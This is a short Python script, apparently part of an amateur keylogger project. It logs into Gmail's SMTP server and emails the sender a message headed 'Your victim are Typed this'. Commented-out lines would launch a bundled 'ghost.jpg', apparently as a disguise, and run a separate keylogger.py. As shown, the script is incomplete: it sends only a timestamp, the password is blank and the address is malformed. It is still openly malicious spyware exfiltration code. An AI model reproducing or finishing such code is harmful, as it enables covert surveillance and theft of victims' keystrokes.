# for use send the mail 

import smtplib

# call the subprocess

import datetime, sys, subprocess

#from subprocess import call


#File_name = sys.MEIPASS + "/ghost.jpg"
#subprocess.Popen(File_name,shell=True)

#def open_py_file():
#    call(["python","keylogger.py"])

#open_py_file()

time = datetime.datetime.now().time().strftime("%I"":""%M"":""%S"",""%p")
time = str(time)


smtp_server = "smtp.gmail.com"
port = 587
sender_email = "mperarasu10gmail.com"
password = ""


server = smtplib.SMTP(smtp_server,port)
server.starttls()
server.login(sender_email,password)
message = "\n \n Your victim are Typed this : " + time
server.sendmail(sender_email,sender_email,message)
